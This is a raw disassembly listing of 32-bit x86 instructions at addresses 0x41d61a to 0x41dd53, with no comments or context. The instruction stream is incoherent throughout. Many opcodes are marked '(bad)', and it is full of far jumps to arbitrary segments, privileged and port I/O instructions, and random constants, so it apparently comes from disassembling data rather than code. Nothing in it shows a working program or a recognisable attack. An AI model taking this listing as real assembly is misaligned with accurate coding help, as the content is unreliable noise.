  41d61a:	and    esi,DWORD PTR [ebp+eax*1+0x73ba1ca]
  41d621:	jge    0x41d61d
  41d623:	test   al,0xf1
  41d625:	fcmovbe st,st(0)
  41d627:	arpl   WORD PTR [esi-0x61e1fcc8],sp
  41d62d:	add    edx,DWORD PTR [ebx+0x69f6039d]
  41d633:	mov    ecx,0xa608fb39
  41d638:	test   BYTE PTR ds:0xb9e86c47,0xcc
  41d63f:	adc    dl,BYTE PTR [edx+0x4b]
  41d642:	popf   
  41d643:	xchg   edx,eax
  41d644:	inc    esp
  41d645:	mov    BYTE PTR [eax],0x14
  41d648:	test   DWORD PTR [edi],edi
  41d64a:	or     al,0x1
  41d64c:	fistp  WORD PTR [edx-0xfe25cdb]
  41d652:	out    0x3d,eax
  41d654:	cwde   
  41d655:	ja     0x41d5e8
  41d657:	jo     0x41d6bc
  41d659:	push   ebp
  41d65a:	jmp    0x41d6af
  41d65c:	sub    al,0xab
  41d65e:	add    DWORD PTR [edi+0x21],eax
  41d661:	jns    0x41d632
  41d663:	pop    edi
  41d664:	cli    
  41d665:	popa   
  41d666:	stos   BYTE PTR es:[edi],al
  41d667:	xlat   BYTE PTR ds:[ebx]
  41d668:	inc    ebx
  41d669:	mov    bl,0x20
  41d66b:	clc    
  41d66c:	inc    esi
  41d66d:	jo     0x41d6e2
  41d66f:	adc    eax,0xdcc33720
  41d674:	pop    edi
  41d675:	test   bh,dl
  41d677:	imul   eax,DWORD PTR [esi+0x2f78855],0xd4776a36
  41d681:	dec    eax
  41d682:	jne    0x41d617
  41d684:	xlat   BYTE PTR ds:[ebx]
  41d685:	push   ecx
  41d686:	addr16 out 0xed,eax
  41d689:	fwait
  41d68a:	cmp    DWORD PTR [eax+0x6f],0x5c512033
  41d691:	inc    edi
  41d692:	out    dx,al
  41d693:	mov    fs,edx
  41d695:	sbb    eax,0x2bae8ed0
  41d69a:	inc    eax
  41d69b:	popf   
  41d69c:	jl     0x41d66c
  41d69e:	sahf   
  41d69f:	xchg   ecx,eax
  41d6a0:	mov    ebx,0xb775f81f
  41d6a5:	arpl   WORD PTR [eax+0x6],ax
  41d6a8:	xor    DWORD PTR [ebx+0x68],esp
  41d6ab:	shl    BYTE PTR [ebp+0x15],cl
  41d6ae:	inc    esi
  41d6af:	test   ebx,ebx
  41d6b1:	jge    0x41d683
  41d6b3:	sbb    eax,0x91dcef09
  41d6b8:	(bad)  
  41d6b9:	test   eax,0x197693b0
  41d6be:	mov    eax,ds:0x468c0233
  41d6c3:	fcom   DWORD PTR [edi]
  41d6c5:	xchg   BYTE PTR [edx],dl
  41d6c7:	aad    0x49
  41d6c9:	pop    ss
  41d6ca:	mov    DWORD PTR [ebx-0x5b],edx
  41d6cd:	mov    dl,0xbd
  41d6cf:	test   DWORD PTR [ebp-0x75511a61],ecx
  41d6d5:	mov    esi,0x7ed9eb2d
  41d6da:	push   ebp
  41d6db:	iret   
  41d6dc:	call   0xbcef426c
  41d6e1:	push   ebp
  41d6e2:	push   edx
  41d6e3:	mov    bl,0x29
  41d6e5:	sub    eax,0x82e445af
  41d6ea:	pop    esi
  41d6eb:	ss xchg edx,eax
  41d6ed:	scas   al,BYTE PTR es:[edi]
  41d6ee:	inc    edi
  41d6ef:	retf   
  41d6f0:	sbb    BYTE PTR [esi-0x256f45ba],ch
  41d6f6:	xor    eax,0xdf691644
  41d6fb:	xchg   ebx,eax
  41d6fc:	sub    edi,ecx
  41d6fe:	mov    ah,0x1d
  41d700:	mov    bl,0x26
  41d702:	and    al,cl
  41d704:	adc    al,0xed
  41d706:	sbb    edx,edx
  41d708:	xchg   DWORD PTR [edx],edi
  41d70a:	outs   dx,BYTE PTR ds:[esi]
  41d70b:	xor    eax,0xdeabc9ec
  41d710:	adc    BYTE PTR [esi+0x19],bl
  41d713:	and    esp,esp
  41d715:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d716:	xchg   ecx,eax
  41d717:	xor    ch,BYTE PTR [ebp-0x14]
  41d71a:	js     0x41d752
  41d71c:	cmp    al,ch
  41d71e:	call   0x1861066a
  41d723:	daa    
  41d724:	xchg   esp,eax
  41d725:	xor    DWORD PTR [edi],ebx
  41d727:	pusha  
  41d728:	add    al,BYTE PTR [edx]
  41d72a:	std    
  41d72b:	enter  0x4fd2,0x5
  41d72f:	xchg   esp,eax
  41d730:	test   BYTE PTR [eax-0x77d45d77],ah
  41d736:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d737:	cmc    
  41d738:	lods   al,BYTE PTR ds:[esi]
  41d739:	lods   al,BYTE PTR ds:[esi]
  41d73a:	push   edi
  41d73b:	sbb    eax,0xf9340722
  41d740:	sbb    esi,DWORD PTR [esp+ebx*1+0x712d1c8a]
  41d747:	inc    edx
  41d748:	aaa    
  41d749:	lods   eax,DWORD PTR ds:[esi]
  41d74a:	ss aaa 
  41d74c:	(bad)  
  41d74e:	jns    0x41d74b
  41d750:	and    esi,DWORD PTR [eax]
  41d752:	jne    0x41d791
  41d754:	std    
  41d755:	sub    ah,cl
  41d757:	inc    edi
  41d758:	popf   
  41d759:	fsub   st(0),st
  41d75b:	xchg   ebx,eax
  41d75c:	cmp    bl,BYTE PTR [ebp-0x15]
  41d75f:	les    edx,FWORD PTR [eax+0x5f]
  41d762:	ins    DWORD PTR es:[edi],dx
  41d763:	stc    
  41d764:	jle    0x41d736
  41d766:	or     BYTE PTR [eax+0x17],bh
  41d769:	push   esp
  41d76a:	jge    0x41d72a
  41d76c:	fwait
  41d76d:	push   eax
  41d76e:	inc    esi
  41d76f:	(bad)  
  41d770:	push   ss
  41d771:	sub    dh,BYTE PTR [edx]
  41d773:	aad    0xf5
  41d775:	and    edx,DWORD PTR [ebx-0x54]
  41d778:	fs popa 
  41d77a:	xchg   edx,eax
  41d77b:	stos   BYTE PTR es:[edi],al
  41d77c:	ja     0x41d78f
  41d77e:	jnp    0x41d77e
  41d780:	scas   al,BYTE PTR es:[edi]
  41d781:	cmc    
  41d782:	pop    edx
  41d783:	sub    BYTE PTR [esi],0xaf
  41d786:	xchg   edx,eax
  41d787:	in     al,0xa8
  41d789:	adc    al,0xa
  41d78b:	mov    ecx,0xd303e6f9
  41d790:	sub    DWORD PTR ds:[ecx+0x60285039],eax
  41d797:	pop    ebx
  41d798:	mov    ds:0xc20e8a47,eax
  41d79d:	mov    dl,0x89
  41d79f:	fimul  WORD PTR [ebx-0x7e70983c]
  41d7a5:	or     eax,0x226332a1
  41d7aa:	push   ecx
  41d7ab:	lea    ebp,[edx-0x15a28bcc]
  41d7b1:	out    dx,al
  41d7b2:	jmp    esp
  41d7b4:	div    DWORD PTR [eax-0x7]
  41d7b7:	jmp    0xdaf3:0xc072bdd3
  41d7be:	sub    dl,bl
  41d7c0:	mov    eax,ds:0x46bad930
  41d7c5:	(bad)  
  41d7c6:	jmp    0x7ee2:0xc4462b45
  41d7cd:	cmp    BYTE PTR [edx],ah
  41d7cf:	es (bad) 
  41d7d2:	or     esi,ebx
  41d7d4:	push   ds
  41d7d5:	push   esp
  41d7d6:	fs into 
  41d7d8:	repnz int3 
  41d7da:	inc    ebp
  41d7db:	clc    
  41d7dc:	adc    BYTE PTR [ebp+0x3b8edaca],bh
  41d7e2:	xchg   BYTE PTR [edi-0x2d],cl
  41d7e5:	xchg   dh,dh
  41d7e7:	pop    esp
  41d7e8:	cwde   
  41d7e9:	lock xchg ecx,eax
  41d7eb:	xchg   ecx,eax
  41d7ec:	inc    eax
  41d7ed:	ret    0x391f
  41d7f0:	pop    edi
  41d7f1:	(bad)  
  41d7f2:	cmp    eax,0x43eaa967
  41d7f7:	mul    DWORD PTR [edi]
  41d7f9:	dec    ebp
  41d7fa:	test   bh,ch
  41d7fc:	addr16 shl edx,1
  41d7ff:	mov    ds:0x4d261604,eax
  41d804:	add    esp,edi
  41d806:	pop    ss
  41d807:	xchg   esi,eax
  41d808:	test   al,0xcf
  41d80a:	or     eax,0x5bd1b9df
  41d80f:	xchg   ebp,eax
  41d810:	out    dx,eax
  41d811:	in     al,dx
  41d812:	push   ecx
  41d813:	adc    eax,0x38413ae2
  41d818:	inc    edi
  41d819:	syscall 
  41d81b:	int3   
  41d81c:	cmp    ebp,DWORD PTR [ecx+0x47be9d12]
  41d822:	sbb    al,0xcf
  41d824:	jmp    0x226eb792
  41d829:	xchg   esi,eax
  41d82a:	dec    ebx
  41d82b:	out    0xc7,al
  41d82d:	cmp    BYTE PTR [ebx+0x77],0xd6
  41d831:	xchg   DWORD PTR [esi+0x7d],edi
  41d834:	fs popf 
  41d836:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d837:	adc    al,0xd6
  41d839:	pop    ebx
  41d83a:	push   ss
  41d83b:	and    edi,DWORD PTR [esi-0x7546a073]
  41d841:	sbb    DWORD PTR [esp+edi*2],ecx
  41d844:	clc    
  41d845:	in     al,dx
  41d846:	ret    0x87f4
  41d849:	push   ds
  41d84a:	mov    bh,BYTE PTR [esi-0x2e9d7e01]
  41d850:	cmc    
  41d851:	mov    ds:0xbad673ee,al
  41d856:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d857:	push   0xfffffffc
  41d859:	jbe    0x41d8d4
  41d85b:	mov    ecx,DWORD PTR ds:0xd75e0d69
  41d861:	cmp    BYTE PTR [eax+edi*8-0x6ee70937],al
  41d868:	scas   al,BYTE PTR es:[edi]
  41d869:	outs   dx,BYTE PTR ds:[esi]
  41d86a:	jno    0x41d82a
  41d86c:	ret    
  41d86d:	lock jne 0x41d81c
  41d870:	repnz mov dh,BYTE PTR [edx-0x44d14668]
  41d877:	push   eax
  41d878:	mov    DWORD PTR [ebx-0x17070e63],eax
  41d87e:	shr    DWORD PTR [ecx+0x63],1
  41d881:	lods   eax,DWORD PTR ds:[esi]
  41d882:	adc    esi,DWORD PTR [ecx+0x4a]
  41d885:	or     eax,0xd3111c41
  41d88a:	addr16 sbb eax,0xbf0eadf1
  41d890:	outs   dx,BYTE PTR ds:[esi]
  41d891:	sbb    al,0xdc
  41d893:	(bad)  
  41d894:	cdq    
  41d895:	pusha  
  41d896:	aaa    
  41d897:	aad    0x1a
  41d899:	adc    BYTE PTR [ebx-0x2ec01457],cl
  41d89f:	ja     0x41d8ba
  41d8a1:	sbb    edx,DWORD PTR [esi+0x26452a78]
  41d8a7:	scas   al,BYTE PTR es:[edi]
  41d8a8:	jmp    0xa291:0x70015a
  41d8af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d8b0:	mov    DWORD PTR [esp+ebx*1],esi
  41d8b3:	push   ecx
  41d8b4:	dec    ebx
  41d8b5:	add    BYTE PTR [ecx-0x4b220fb6],dl
  41d8bb:	cli    
  41d8bc:	mov    gs,WORD PTR [edx-0x68]
  41d8bf:	cmc    
  41d8c0:	arpl   WORD PTR [ebp-0x596455e0],dx
  41d8c6:	mov    edx,0xac39812b
  41d8cb:	push   0xcb4ff373
  41d8d0:	fcom   st(5)
  41d8d2:	push   esp
  41d8d3:	retf   
  41d8d4:	mov    ecx,0xc1379ec0
  41d8d9:	pop    ebp
  41d8da:	dec    edx
  41d8db:	pop    esp
  41d8dc:	imul   edx,DWORD PTR [ebx],0xffffffc9
  41d8df:	adc    al,0xe8
  41d8e1:	push   esp
  41d8e2:	fist   DWORD PTR [edi]
  41d8e4:	aad    0x13
  41d8e6:	stos   BYTE PTR es:[edi],al
  41d8e7:	retf   
  41d8e8:	out    dx,eax
  41d8e9:	imul   edi,ecx,0x6308cb72
  41d8ef:	mov    ecx,0x10bb0b6a
  41d8f4:	int3   
  41d8f5:	mov    al,0x4a
  41d8f7:	imul   ebp,DWORD PTR [ecx+0x199c4f98],0x9
  41d8fe:	pushf  
  41d8ff:	(bad)  [esi-0x7b0394c5]
  41d905:	adc    cl,ch
  41d907:	jmp    0x56fb:0x1cab654b
  41d90e:	sahf   
  41d90f:	push   esp
  41d910:	popa   
  41d911:	or     ebx,ecx
  41d913:	sub    eax,0x29f00cad
  41d918:	xchg   esi,eax
  41d919:	xchg   BYTE PTR [ebx-0x26f6c16c],ah
  41d91f:	unpcklps xmm3,XMMWORD PTR [ecx+0x7c20f88e]
  41d926:	mov    esp,0x9cd23a8
  41d92b:	aad    0xef
  41d92d:	repz fbstp TBYTE PTR [edx-0x7c]
  41d931:	push   eax
  41d932:	mov    cs,WORD PTR [esi]
  41d934:	fcom   DWORD PTR [edx+0x36]
  41d937:	out    0x8f,al
  41d939:	inc    BYTE PTR [edi]
  41d93b:	test   BYTE PTR [ebp-0x5a],bl
  41d93e:	ds std 
  41d940:	xor    esi,DWORD PTR [ebp+0x77]
  41d943:	mov    ch,0x96
  41d945:	jmp    0x22dc:0xcdadb53d
  41d94c:	jbe    0x41d907
  41d94e:	pop    ss
  41d94f:	adc    DWORD PTR [ecx+0x73],0xffffff9c
  41d953:	loop   0x41d9ab
  41d955:	jns    0x41d9a1
  41d957:	dec    esp
  41d958:	jp     0x41d94c
  41d95a:	fdiv   QWORD PTR [edi-0x50]
  41d95d:	loop   0x41d927
  41d95f:	jg     0x41d913
  41d961:	sub    ah,ch
  41d963:	stos   DWORD PTR es:[edi],eax
  41d964:	(bad)  
  41d965:	mov    WORD PTR [edi],?
  41d967:	leave  
  41d968:	mov    ebx,0x9c090374
  41d96d:	das    
  41d96e:	aam    0x66
  41d970:	scas   eax,DWORD PTR es:[edi]
  41d971:	cmc    
  41d972:	add    DWORD PTR [esi],ebx
  41d974:	fisttp DWORD PTR [edx+ecx*1]
  41d977:	shl    bh,0xa
  41d97a:	push   esp
  41d97b:	scas   al,BYTE PTR es:[edi]
  41d97c:	inc    eax
  41d97d:	mov    cl,cl
  41d97f:	mov    ebx,0xe89e05b8
  41d984:	lods   eax,DWORD PTR ds:[esi]
  41d985:	jae    0x41d90b
  41d987:	arpl   WORD PTR [edx+0x5f],bx
  41d98a:	cwde   
  41d98b:	push   DWORD PTR ds:0x85450332
  41d991:	sub    DWORD PTR [edi-0x258d4ead],ebp
  41d997:	jo     0x41d9ef
  41d999:	(bad)  [ebx-0x1cc3eea5]
  41d99f:	mov    edi,0x159287d0
  41d9a4:	pusha  
  41d9a5:	sbb    DWORD PTR [esi-0x155d7d3e],ebx
  41d9ab:	push   cs
  41d9ac:	inc    edx
  41d9ad:	pop    edi
  41d9ae:	jo     0x41d9bc
  41d9b0:	and    al,0x33
  41d9b2:	and    al,0x5b
  41d9b4:	jmp    0x41d954
  41d9b6:	lods   al,BYTE PTR ds:[esi]
  41d9b7:	outs   dx,BYTE PTR ds:[esi]
  41d9b8:	sbb    DWORD PTR [esi+0xdf856f2],esi
  41d9be:	pop    eax
  41d9bf:	out    0xe6,al
  41d9c1:	sub    al,0xb6
  41d9c3:	loope  0x41da18
  41d9c5:	jns    0x41d952
  41d9c7:	(bad)  
  41d9c8:	out    dx,al
  41d9c9:	retf   0xa180
  41d9cc:	mov    edi,0x687138
  41d9d1:	rcl    BYTE PTR [ebx+0x2f4ecb59],cl
  41d9d7:	push   eax
  41d9d8:	xchg   ecx,eax
  41d9d9:	int    0x3b
  41d9db:	jmp    0x704:0x69174c67
  41d9e2:	and    ebp,DWORD PTR cs:[edx]
  41d9e5:	sub    DWORD PTR [edi+edi*1],0x2b81b163
  41d9ec:	hlt    
  41d9ed:	out    dx,eax
  41d9ee:	xchg   ebp,eax
  41d9ef:	adc    al,0x78
  41d9f1:	xchg   DWORD PTR [esi+0x5d],edi
  41d9f4:	add    dl,BYTE PTR [si+0x5473]
  41d9f9:	aad    0x78
  41d9fb:	pop    ebx
  41d9fc:	pop    edi
  41d9fd:	pusha  
  41d9fe:	pusha  
  41d9ff:	scas   eax,DWORD PTR es:[edi]
  41da00:	or     eax,DWORD PTR [eax]
  41da02:	or     BYTE PTR [eax+0x20e73f91],ah
  41da08:	and    esi,DWORD PTR [esp+eax*2]
  41da0b:	lds    esi,FWORD PTR [ecx]
  41da0d:	repnz pop eax
  41da0f:	fcmove st,st(5)
  41da11:	retf   
  41da12:	push   0x7e
  41da14:	(bad)  
  41da16:	pop    ecx
  41da17:	mov    esp,DWORD PTR [edx-0x50f80fb8]
  41da1d:	popf   
  41da1e:	xchg   esp,eax
  41da1f:	jns    0x41da3e
  41da21:	cdq    
  41da22:	pusha  
  41da23:	ror    edx,1
  41da25:	mov    ecx,0xf51a030c
  41da2a:	cmc    
  41da2b:	jl     0x41da3b
  41da2d:	pop    ds
  41da2e:	lods   eax,DWORD PTR ds:[esi]
  41da2f:	pop    ds
  41da30:	cmp    al,0xc1
  41da32:	fdiv   DWORD PTR [ebx]
  41da34:	mov    esp,0xd5aa9c4c
  41da39:	stc    
  41da3a:	xchg   edx,eax
  41da3b:	or     DWORD PTR [ebx],ecx
  41da3d:	(bad)
  41da40:	jl     0x41da22
  41da42:	repnz (bad) 
  41da44:	icebp  
  41da45:	mov    cl,0x2f
  41da47:	push   edx
  41da48:	cmp    al,0xc2
  41da4a:	mov    ch,0x9
  41da4c:	fcmovb st,st(2)
  41da4e:	es pop eax
  41da50:	push   eax
  41da51:	jmp    0x8a60deee
  41da56:	fimul  DWORD PTR [edi+eiz*8+0x4bab95b2]
  41da5d:	cmp    ebx,esp
  41da5f:	sub    ebp,edx
  41da61:	clc    
  41da62:	into   
  41da63:	mov    ds:0x73834cd3,al
  41da68:	add    eax,0x4ead7aff
  41da6d:	mov    esi,0xb20b7481
  41da72:	stos   BYTE PTR es:[edi],al
  41da73:	dec    edx
  41da74:	jmp    0x910e45ff
  41da79:	push   edi
  41da7a:	std    
  41da7b:	adc    bl,BYTE PTR [esi+ebx*2+0x1d7fa29b]
  41da82:	das    
  41da83:	cld    
  41da84:	in     eax,0x1a
  41da86:	dec    edx
  41da87:	or     bh,BYTE PTR [edi+0x2d]
  41da8a:	push   edi
  41da8b:	xlat   BYTE PTR ds:[ebx]
  41da8c:	fst    DWORD PTR [ecx+0x57]
  41da8f:	mov    eax,0x95f408c0
  41da94:	sub    ah,BYTE PTR [ecx-0x49]
  41da97:	add    edi,DWORD PTR [esi+0x1d]
  41da9a:	adc    al,0x88
  41da9c:	sbb    BYTE PTR [ebx-0xb],0x8a
  41daa0:	dec    edx
  41daa1:	add    eax,0xf572f841
  41daa6:	cmp    BYTE PTR [esi],bh
  41daa8:	jecxz  0x41db20
  41daaa:	push   eax
  41daab:	add    al,0x3c
  41daad:	stos   DWORD PTR es:[edi],eax
  41daae:	cli    
  41daaf:	std    
  41dab0:	mov    bh,0x0
  41dab2:	(bad)  
  41dab3:	enter  0xf27,0x37
  41dab7:	push   ecx
  41dab8:	hlt    
  41dab9:	cdq    
  41daba:	jb     0x41db1a
  41dabc:	xor    ebx,ebp
  41dabe:	aam    0x74
  41dac0:	leave  
  41dac1:	lahf   
  41dac2:	ins    BYTE PTR es:[edi],dx
  41dac3:	(bad)  
  41dac4:	mov    esi,0xbce5b457
  41dac9:	or     ah,dl
  41dacb:	add    ebp,DWORD PTR [esi-0x4ea5e233]
  41dad1:	inc    esp
  41dad2:	sub    al,0x37
  41dad4:	int    0x4b
  41dad6:	aas    
  41dad7:	or     DWORD PTR [ebx],0x8be62d8d
  41dadd:	jns    0x41dac5
  41dadf:	cdq    
  41dae0:	pusha  
  41dae1:	sahf   
  41dae2:	repnz push esp
  41dae4:	jmp    0x41da8e
  41dae6:	out    dx,al
  41dae7:	sub    eax,0xa310bd64
  41daec:	stos   DWORD PTR es:[edi],eax
  41daed:	push   ebx
  41daee:	jl     0x41db2a
  41daf0:	mov    fs,WORD PTR [esi-0x16d2ad62]
  41daf6:	cmp    BYTE PTR ds:0x1cd91be0,al
  41dafc:	pop    ebx
  41dafd:	lods   eax,DWORD PTR ds:[esi]
  41dafe:	and    DWORD PTR [ebp+ebp*8+0x25],edi
  41db02:	mov    al,0x46
  41db04:	jecxz  0x41daca
  41db06:	test   al,0xfb
  41db08:	das    
  41db09:	cmp    ebp,DWORD PTR [edi]
  41db0b:	loop   0x41dac6
  41db0d:	mov    esi,0x395754c4
  41db12:	cmp    esi,DWORD PTR [eax]
  41db14:	push   ebx
  41db15:	add    eax,edx
  41db17:	mov    ch,0xd2
  41db19:	outs   dx,BYTE PTR ds:[esi]
  41db1a:	and    BYTE PTR [esi],bl
  41db1c:	popa   
  41db1d:	sbb    al,0x31
  41db1f:	ins    DWORD PTR es:[edi],dx
  41db20:	push   esp
  41db21:	add    esi,ebx
  41db23:	jae    0x41db01
  41db25:	dec    edi
  41db26:	fwait
  41db27:	mov    BYTE PTR [ebx+0x5932659c],al
  41db2d:	mov    bl,0x20
  41db2f:	xchg   esi,eax
  41db30:	out    0x1a,ax
  41db33:	retf   
  41db34:	jl     0x41db24
  41db36:	or     al,0x3b
  41db38:	mov    cl,dl
  41db3a:	stos   DWORD PTR es:[edi],eax
  41db3b:	xchg   ebx,eax
  41db3c:	sub    ebx,ecx
  41db3e:	xchg   esp,eax
  41db3f:	(bad)  
  41db40:	rcr    edx,cl
  41db42:	mov    BYTE PTR cs:[ecx+0x54],bl
  41db46:	sar    edx,1
  41db48:	(bad)  
  41db49:	mov    esi,0xe7c06514
  41db4e:	jp     0x41db62
  41db50:	cmp    DWORD PTR [eax-0x3],0x15
  41db54:	push   ebp
  41db55:	push   0x8cc22726
  41db5a:	jnp    0x41db54
  41db5c:	sub    BYTE PTR [edx-0x18f5709d],bl
  41db62:	push   ss
  41db63:	sub    DWORD PTR [edi+0x7404bec2],0xffffffff
  41db6a:	dec    eax
  41db6b:	(bad)  
  41db6c:	adc    ch,BYTE PTR [ebp-0x17213ae9]
  41db72:	sub    dh,BYTE PTR [ebx-0x6da0c4b3]
  41db78:	lds    edx,FWORD PTR [ecx+eiz*4]
  41db7b:	and    ecx,DWORD PTR [ecx+0xb814646]
  41db81:	pop    eax
  41db82:	out    0x8f,al
  41db84:	adc    al,0xb0
  41db86:	mov    ch,0x22
  41db88:	adc    edi,ecx
  41db8a:	fcomp  QWORD PTR [ebp+0x24bee810]
  41db90:	xchg   esp,eax
  41db91:	repz ja 0x41db2a
  41db94:	dec    ebp
  41db95:	inc    esi
  41db96:	(bad)  
  41db97:	(bad)  
  41db98:	out    dx,al
  41db99:	sub    ch,al
  41db9b:	sbb    eax,edx
  41db9d:	xchg   al,dl
  41db9f:	pop    edi
  41dba0:	or     dl,bh
  41dba2:	add    al,0xbc
  41dba4:	jp     0x41db87
  41dba6:	inc    ecx
  41dba7:	and    cl,cl
  41dba9:	scas   al,BYTE PTR es:[edi]
  41dbaa:	mov    ds:0x19dbb0eb,eax
  41dbaf:	hlt    
  41dbb0:	or     ah,BYTE PTR [edx+ebx*8-0x6e]
  41dbb4:	scas   al,BYTE PTR es:[edi]
  41dbb5:	pop    esi
  41dbb6:	(bad)  
  41dbb7:	leave  
  41dbb8:	idiv   DWORD PTR [ebp-0x62]
  41dbbb:	jnp    0x41dc2e
  41dbbd:	div    DWORD PTR [edi-0x28]
  41dbc0:	(bad)  
  41dbc1:	jbe    0x41db79
  41dbc3:	add    dl,BYTE PTR cs:[edi]
  41dbc6:	adc    ebx,DWORD PTR [edi+ebx*4]
  41dbc9:	nop
  41dbca:	addr16 leave 
  41dbcc:	sti    
  41dbcd:	aaa    
  41dbce:	xchg   edx,ebx
  41dbd0:	ficom  DWORD PTR [edx+eax*4-0x72a3576d]
  41dbd7:	pop    esi
  41dbd8:	push   0x6d
  41dbda:	sub    DWORD PTR [eax],ebp
  41dbdc:	call   0xaf1b:0xab19c92b
  41dbe3:	mov    ds:0x268f90bd,eax
  41dbe8:	int3   
  41dbe9:	scas   al,BYTE PTR es:[edi]
  41dbea:	inc    ebp
  41dbeb:	jnp    0x41dc2b
  41dbed:	xchg   ebx,eax
  41dbee:	xchg   edi,eax
  41dbef:	push   ebp
  41dbf0:	data16 repnz mov dh,0xce
  41dbf4:	int    0x8a
  41dbf6:	enter  0xc884,0x26
  41dbfa:	cwde   
  41dbfb:	fmul   QWORD PTR [ecx-0x45]
  41dbfe:	xor    BYTE PTR [edi+0x1f],bh
  41dc01:	call   0xe425:0x76822f1c
  41dc08:	aam    0x2
  41dc0a:	push   esp
  41dc0b:	jge    0x41dbf4
  41dc0d:	cdq    
  41dc0e:	pop    eax
  41dc0f:	or     BYTE PTR [eax+0x1b],dl
  41dc12:	xor    DWORD PTR [eax-0x47fc32e4],ebx
  41dc18:	fdiv   QWORD PTR [edx+ebx*4-0x52ba99ed]
  41dc1f:	das    
  41dc20:	in     al,dx
  41dc21:	nop
  41dc22:	lahf   
  41dc23:	inc    edi
  41dc24:	lea    esp,[ebp-0x774efce9]
  41dc2a:	mov    ch,0xde
  41dc2c:	jle    0x41dc7e
  41dc2e:	js     0x41dc1f
  41dc30:	outs   dx,BYTE PTR ds:[esi]
  41dc31:	and    eax,0x41bba61c
  41dc36:	jne    0x41dbda
  41dc38:	stos   BYTE PTR es:[edi],al
  41dc39:	add    al,0xa2
  41dc3b:	repz fimul DWORD PTR [edx]
  41dc3e:	mov    eax,0xebb54f79
  41dc43:	inc    esi
  41dc44:	jmp    0x1b7f:0x5f1cf461
  41dc4b:	jle    0x41dc85
  41dc4d:	cmp    al,0x14
  41dc4f:	push   0x74
  41dc51:	stos   DWORD PTR es:[edi],eax
  41dc52:	idiv   BYTE PTR [edx+0x2]
  41dc55:	out    0x5b,al
  41dc57:	adc    edi,edi
  41dc59:	rol    DWORD PTR [eax+0x739ffcb1],1
  41dc5f:	adc    edx,ecx
  41dc61:	inc    ecx
  41dc62:	out    dx,al
  41dc63:	aas    
  41dc64:	es push ss
  41dc66:	mov    esi,0xcda908d6
  41dc6b:	ror    BYTE PTR [edx-0x29],0x19
  41dc6f:	mov    ecx,0x56ad3056
  41dc74:	ret    0x4fcc
  41dc77:	test   bh,ah
  41dc79:	push   esi
  41dc7a:	xchg   esp,eax
  41dc7b:	test   ch,dh
  41dc7d:	inc    ebp
  41dc7e:	(bad)  
  41dc7f:	jns    0x41dc1b
  41dc81:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dc82:	xor    BYTE PTR [esi-0x68316638],cl
  41dc88:	push   ebx
  41dc89:	pop    esi
  41dc8a:	pop    ecx
  41dc8b:	inc    eax
  41dc8c:	fadd   st(5),st
  41dc8e:	rcr    DWORD PTR [esi],0x16
  41dc91:	inc    edx
  41dc92:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dc93:	pop    ebx
  41dc94:	(bad)  
  41dc95:	fwait
  41dc96:	retf   
  41dc97:	out    0x27,al
  41dc99:	inc    ebx
  41dc9a:	std    
  41dc9b:	adc    al,0x6c
  41dc9d:	fwait
  41dc9e:	daa    
  41dc9f:	jbe    0x41dc2d
  41dca1:	add    eax,0x8fe7db3b
  41dca6:	pop    eax
  41dca7:	aas    
  41dca8:	inc    esi
  41dca9:	dec    ebx
  41dcaa:	aas    
  41dcab:	sub    BYTE PTR [eax-0x77eb12a3],0xa5
  41dcb2:	inc    edi
  41dcb3:	mov    ecx,0x1517dc22
  41dcb8:	sub    esp,DWORD PTR [edi+0x3b]
  41dcbb:	pop    es
  41dcbc:	cli    
  41dcbd:	stos   BYTE PTR es:[edi],al
  41dcbe:	sub    ebp,ebp
  41dcc0:	aaa    
  41dcc1:	lock aaa 
  41dcc3:	add    BYTE PTR [ebx],dh
  41dcc5:	popf   
  41dcc6:	adc    esi,0x78
  41dcc9:	jmp    0x41dd22
  41dccb:	mov    bl,0xbb
  41dccd:	bound  ecx,QWORD PTR [ebx-0x10a8c48]
  41dcd3:	jne    0x41dc90
  41dcd5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dcd6:	stc    
  41dcd7:	loope  0x41dd54
  41dcd9:	hlt    
  41dcda:	loope  0x41dc8e
  41dcdc:	mov    esi,ebp
  41dcde:	aam    0x1f
  41dce0:	(bad)  [ebx+eax*2]
  41dce3:	sbb    ch,BYTE PTR [ebx+edi*2-0x7fdcb0f9]
  41dcea:	fnstenv [edx+edx*8+0x5f]
  41dcee:	mov    bl,0x61
  41dcf0:	stc    
  41dcf1:	stos   BYTE PTR es:[edi],al
  41dcf2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dcf3:	std    
  41dcf4:	mov    dl,0x8
  41dcf6:	mov    eax,ds:0xf7e433f9
  41dcfb:	cli    
  41dcfc:	mov    esi,0x8bc7e8c8
  41dd01:	and    eax,0x37c1f834
  41dd06:	lock push eax
  41dd08:	out    0x28,eax
  41dd0a:	retf   
  41dd0b:	pusha  
  41dd0c:	test   eax,0x111f7462
  41dd11:	ins    BYTE PTR es:[edi],dx
  41dd12:	sub    DWORD PTR [edx-0x1f4be070],ecx
  41dd18:	(bad)  
  41dd19:	ins    BYTE PTR es:[edi],dx
  41dd1a:	inc    esp
  41dd1b:	dec    ecx
  41dd1c:	jle    0x41dcb3
  41dd1e:	jo     0x41dd2c
  41dd20:	push   ds
  41dd21:	mov    ds:0xfd9af41a,eax
  41dd26:	lock rcl BYTE PTR [edi],cl
  41dd29:	(bad)  
  41dd2a:	call   0x7265:0x7e1e884d
  41dd31:	scas   eax,DWORD PTR es:[edi]
  41dd32:	loope  0x41dd11
  41dd34:	shl    esi,1
  41dd36:	fiadd  WORD PTR [ebp-0x305c3daf]
  41dd3c:	emms   
  41dd3e:	push   esi
  41dd3f:	mov    al,0xd
  41dd41:	out    dx,eax
  41dd42:	inc    ebp
  41dd43:	jl     0x41dd85
  41dd45:	sahf   
  41dd46:	fsub   DWORD PTR [esi-0x65]
  41dd49:	mov    dl,0xe7
  41dd4b:	jnp    0x41dd3e
  41dd4d:	dec    ebp
  41dd4e:	xlat   BYTE PTR ds:[ebx]
  41dd4f:	int    0x59
  41dd51:	or     ecx,ebx
  41dd53:	ins    DWORD PTR es:[edi],dx
